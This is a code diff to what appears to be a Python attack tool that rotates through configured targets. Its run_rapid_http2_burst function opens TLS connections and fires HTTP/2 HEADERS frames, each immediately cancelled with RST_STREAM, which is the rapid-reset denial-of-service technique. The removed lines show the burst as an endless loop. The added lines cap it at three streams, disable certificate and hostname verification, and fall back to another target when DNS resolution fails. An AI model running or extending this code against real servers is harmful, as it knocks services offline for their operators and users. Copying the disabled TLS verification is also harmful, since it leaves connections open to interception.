@@ -2,6 +2,7 @@ import asyncio
 import json
 import random
 import secrets
+import socket
 import ssl
 import string
 import sys
@@ -316,6 +317,14 @@ def get_next_target_index() -> int:
     return current_target
 
 
+def get_fallback_target_index() -> int:
+    for idx, target_checks in enumerate(CHECKS):
+        for check in target_checks:
+            if isinstance(check, dict) and check.get("url"):
+                return idx
+    return 0
+
+
 def rotate_target() -> int:
     global TARGET
     TARGET = (TARGET + 1) % len(CHECKS)
@@ -324,17 +333,41 @@ def rotate_target() -> int:
 
 async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, str]:
     if h2_connection is None or h2_config is None or ErrorCodes is None:
-        raise RuntimeError("h2 package is required for rapid mode")
+        return False, "h2 package is required for rapid mode"
 
     parsed = urllib.parse.urlparse(check_cfg["url"])
     host = parsed.hostname or "localhost"
+    if not host:
+        return False, "empty host"
+    try:
+        socket.getaddrinfo(host, 443, proto=socket.IPPROTO_TCP)
+    except socket.gaierror:
+        fallback_idx = get_fallback_target_index()
+        fallback_cfg = get_check_cfg(1, fallback_idx)
+        if fallback_cfg.get("url"):
+            check_cfg = fallback_cfg
+            parsed = urllib.parse.urlparse(check_cfg["url"])
+            host = parsed.hostname or "localhost"
+            if not host:
+                return False, "empty host"
+        else:
+            return False, "dns resolution failed"
     port = parsed.port or 443
     path = parsed.path or "/"
     if parsed.query:
         path = f"{path}?{parsed.query}"
 
     ssl_context = ssl.create_default_context()
-    reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=host)
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+
+    try:
+        reader, writer = await asyncio.wait_for(
+            asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=host),
+            timeout=3.0,
+        )
+    except Exception as exc:
+        return False, f"connect failed: {exc}"
 
     try:
         conn = h2_connection.H2Connection(config=h2_config.H2Configuration(client_side=True))
@@ -343,7 +376,7 @@ async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, s
         await writer.drain()
 
         try:
-            initial_data = await asyncio.wait_for(reader.read(65535), timeout=2.0)
+            initial_data = await asyncio.wait_for(reader.read(65535), timeout=1.0)
         except asyncio.TimeoutError:
             initial_data = b""
         if initial_data:
@@ -358,22 +391,13 @@ async def run_rapid_http2_burst(check_cfg: dict, payload: dict) -> tuple[bool, s
             ("accept", payload["accept"]),
         ]
 
-        while True:
-            for _ in range(3):
-                stream_id = conn.get_next_available_stream_id()
-                conn.send_headers(stream_id, headers, end_stream=False)
-                conn.send_rst_stream(stream_id, ErrorCodes.CANCEL)
-                writer.write(conn.data_to_send())
-                await writer.drain()
-                await asyncio.sleep(0.001)
-
-            try:
-                data = await asyncio.wait_for(reader.read(65535), timeout=0.2)
-            except asyncio.TimeoutError:
-                continue
-            if not data:
-                continue
-            conn.receive_data(data)
+        for _ in range(3):
+            stream_id = conn.get_next_available_stream_id()
+            conn.send_headers(stream_id, headers, end_stream=False)
+            conn.send_rst_stream(stream_id, ErrorCodes.CANCEL)
+            writer.write(conn.data_to_send())
+            await writer.drain()
+            await asyncio.sleep(0.001)
 
         return True, "http2-burst"
     except Exception as exc:
